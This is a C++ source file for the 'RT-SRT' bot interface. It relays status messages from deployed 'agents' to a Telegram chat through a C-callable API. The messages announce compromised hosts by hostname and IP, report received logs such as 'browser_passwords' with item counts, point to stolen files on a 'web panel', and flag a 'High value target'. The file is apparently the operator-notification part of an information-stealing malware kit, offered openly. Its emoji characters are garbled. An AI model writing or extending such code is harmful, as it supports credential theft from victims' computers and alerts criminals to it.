/*
 * RT-SRT C++ Bot Interface
 * Provides C++ interface for Telegram bot functionality
 */

#include <iostream>
#include <string>
#include <memory>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <vector>
#include <map>
#include <chrono>
#include <fstream>
#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <curl/curl.h>
#include <unistd.h>
#endif

#include "telegram_utils.h"

namespace rt_srt {
namespace bot {

class TelegramBot {
private:
    std::string bot_token_;
    std::string chat_id_;
    std::atomic<bool> running_;
    std::mutex mutex_;
    std::condition_variable cv_;
    std::thread worker_thread_;
    
    struct Message {
        std::string text;
        std::string chat_id;
        std::chrono::system_clock::time_point timestamp;
    };
    
    std::vector<Message> message_queue_;
    
public:
    TelegramBot(const std::string& token, const std::string& chat_id)
        : bot_token_(token), chat_id_(chat_id), running_(false) {}
    
    ~TelegramBot() {
        stop();
    }
    
    bool start() {
        if (running_) {
            return true;
        }
        
        running_ = true;
        worker_thread_ = std::thread(&TelegramBot::worker_loop, this);
        
        return true;
    }
    
    void stop() {
        if (!running_) {
            return;
        }
        
        running_ = false;
        cv_.notify_all();
        
        if (worker_thread_.joinable()) {
            worker_thread_.join();
        }
    }
    
    bool send_message(const std::string& text, const std::string& target_chat = "") {
        std::lock_guard<std::mutex> lock(mutex_);
        
        Message msg;
        msg.text = text;
        msg.chat_id = target_chat.empty() ? chat_id_ : target_chat;
        msg.timestamp = std::chrono::system_clock::now();
        
        message_queue_.push_back(msg);
        cv_.notify_one();
        
        return true;
    }
    
    bool send_log_notification(const std::string& agent_id, 
                              const std::string& log_type,
                              size_t item_count,
                              const std::string& timestamp) {
        std::ostringstream oss;
        oss << "=å *New Log Received*\n\n"
            << "*Agent:* `" << agent_id.substr(0, 8) << "...`\n"
            << "*Type:* " << log_type << "\n"
            << "*Items:* " << item_count << "\n"
            << "*Time:* " << timestamp;
            
        return send_message(oss.str());
    }
    
    bool send_agent_online(const std::string& agent_id,
                          const std::string& hostname,
                          const std::string& ip_address) {
        std::ostringstream oss;
        oss << "=â *Agent Online*\n\n"
            << "*Agent:* `" << agent_id.substr(0, 8) << "...`\n"
            << "*Hostname:* " << hostname << "\n"
            << "*IP:* " << ip_address << "\n"
            << "*Time:* " << get_current_timestamp();
            
        return send_message(oss.str());
    }
    
    bool send_alert(const std::string& message, const std::string& level = "warning") {
        std::string emoji;
        if (level == "error") {
            emoji = "=4";
        } else if (level == "warning") {
            emoji = "=á";
        } else {
            emoji = "9";
        }
        
        std::ostringstream oss;
        oss << emoji << " *Alert*\n\n" << message;
        
        return send_message(oss.str());
    }
    
    bool send_file(const std::string& file_path, const std::string& caption = "") {
        // File sending is more complex and typically done via the Python bot
        // This is a placeholder for file upload functionality
        std::ostringstream oss;
        oss << "=Î *File Ready*\n\n"
            << "*File:* " << file_path << "\n";
        if (!caption.empty()) {
            oss << "*Description:* " << caption << "\n";
        }
        oss << "\nUse web panel to download.";
        
        return send_message(oss.str());
    }
    
private:
    void worker_loop() {
        while (running_) {
            std::unique_lock<std::mutex> lock(mutex_);
            cv_.wait(lock, [this] { return !message_queue_.empty() || !running_; });
            
            if (!running_) {
                break;
            }
            
            // Process all queued messages
            std::vector<Message> messages_to_send;
            messages_to_send.swap(message_queue_);
            lock.unlock();
            
            for (const auto& msg : messages_to_send) {
                send_telegram_message(msg.text, msg.chat_id);
                
                // Rate limiting - don't send more than 30 messages per second
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }
        }
    }
    
    bool send_telegram_message(const std::string& text, const std::string& chat_id) {
        try {
            TelegramUtils utils(bot_token_);
            return utils.send_message(chat_id, text, true); // Use markdown
        } catch (const std::exception& e) {
            std::cerr << "Error sending Telegram message: " << e.what() << std::endl;
            return false;
        }
    }
    
    std::string get_current_timestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        std::ostringstream oss;
        oss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return oss.str();
    }
};

// Global bot instance for C interface
static std::unique_ptr<TelegramBot> g_bot = nullptr;
static std::mutex g_bot_mutex;

// C-style interface for integration with agent code
extern "C" {
    
    bool telegram_bot_init(const char* token, const char* chat_id) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (g_bot) {
            g_bot->stop();
        }
        
        g_bot = std::make_unique<TelegramBot>(token, chat_id);
        return g_bot->start();
    }
    
    void telegram_bot_cleanup() {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (g_bot) {
            g_bot->stop();
            g_bot.reset();
        }
    }
    
    bool telegram_send_message(const char* text) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (!g_bot) {
            return false;
        }
        
        return g_bot->send_message(text);
    }
    
    bool telegram_send_log_notification(const char* agent_id,
                                       const char* log_type,
                                       size_t item_count,
                                       const char* timestamp) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (!g_bot) {
            return false;
        }
        
        return g_bot->send_log_notification(agent_id, log_type, item_count, timestamp);
    }
    
    bool telegram_send_agent_online(const char* agent_id,
                                   const char* hostname,
                                   const char* ip_address) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (!g_bot) {
            return false;
        }
        
        return g_bot->send_agent_online(agent_id, hostname, ip_address);
    }
    
    bool telegram_send_alert(const char* message, const char* level) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (!g_bot) {
            return false;
        }
        
        return g_bot->send_alert(message, level ? level : "info");
    }
    
    bool telegram_send_file(const char* file_path, const char* caption) {
        std::lock_guard<std::mutex> lock(g_bot_mutex);
        
        if (!g_bot) {
            return false;
        }
        
        return g_bot->send_file(file_path, caption ? caption : "");
    }
}

} // namespace bot
} // namespace rt_srt

// Example usage function
void example_usage() {
    using namespace rt_srt::bot;
    
    // Initialize bot
    if (!telegram_bot_init("YOUR_BOT_TOKEN", "YOUR_CHAT_ID")) {
        std::cerr << "Failed to initialize Telegram bot" << std::endl;
        return;
    }
    
    // Send various types of messages
    telegram_send_message("= RT-SRT Agent Started");
    telegram_send_agent_online("agent123456789", "WIN-DESKTOP", "192.168.1.100");
    telegram_send_log_notification("agent123456789", "browser_passwords", 15, "2024-01-01 12:00:00");
    telegram_send_alert("High value target detected!", "warning");
    
    // Cleanup
    telegram_bot_cleanup();
}